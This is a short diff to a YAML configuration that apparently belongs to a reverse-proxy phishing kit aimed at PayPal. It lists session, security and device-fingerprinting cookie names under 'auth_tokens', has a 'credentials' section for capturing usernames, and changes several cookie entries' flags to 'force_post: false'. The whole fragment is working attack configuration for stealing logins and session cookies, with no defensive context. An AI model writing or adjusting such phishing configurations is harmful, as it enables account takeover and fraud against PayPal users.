@@ -32,18 +32,19 @@ auth_tokens:
   - domain: '.paypal.com'
     keys: ['cookie_check', 'LANG', 'nsid', 'login_email', 'ts_c', 'l7_az', 'enforce_policy', 'X-PP-SILOVER', 'fn_dt', 'ui_experience', 'SEGM']
     type: 'cookie'
+    force_post: false
   
   # Session and security cookies
   - domain: '.paypal.com'
     keys: ['x-pp-s', 'ts', 'tsrce', 'akavpau_ppsd', 'KHcl0EuY7AKSMgfvHl7m5PThkXY']
     type: 'cookie'
-    optional: true
+    force_post: false
   
   # Device fingerprinting cookies
   - domain: '.paypal.com'
     keys: ['PYPF', 'x-cdn', 'HaC', 'sc_f']
     type: 'cookie'
-    optional: true
+    force_post: false
 
 credentials:
   username:
